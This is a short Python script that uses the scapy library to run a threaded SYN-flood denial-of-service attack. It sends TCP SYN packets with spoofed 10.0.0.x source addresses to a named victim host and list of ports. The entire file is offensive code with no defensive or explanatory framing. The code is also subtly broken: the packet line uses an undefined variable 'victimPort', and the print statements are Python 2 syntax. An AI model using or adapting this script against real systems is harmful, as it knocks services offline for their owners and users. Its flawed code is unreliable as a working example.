from scapy.all import *
from threading import Thread
import time

# Args:
# victimAddress (string, hostname or ip of target)
# victimPorts (list, port numbers to target)
def sendPackets(victimAddress, victimPorts):
	for port in victimPorts:
		for i in range(1,254):
			packetSYN=IP(src="10.0.0." + str(i), dst=victimAddress, id=1111, ttl=99)/TCP(sport=RandShort(), dport=victimPort, seq=12345, ack=1000, window=1000, flags="S")/"wow look its a lot of random data hello victim"
			print "Sending Packets in 0.1 second intervals for timeout of 4 sec"
			ans,unans=srloop(packetSYN, inter=0.1, retry=2, timeout=4)

# Args:
# victimAddress (string, hostname or ip of target)
# victimPorts (list, port numbers to target)
# numThreads (int, number of threads to run)
def startDDOS(victimAddress, victimPorts, numThreads):
	for i in range(numThreads):
		thread = Thread(target=sendPackets,args=(victimAddress, victimPorts))
		thread.start()
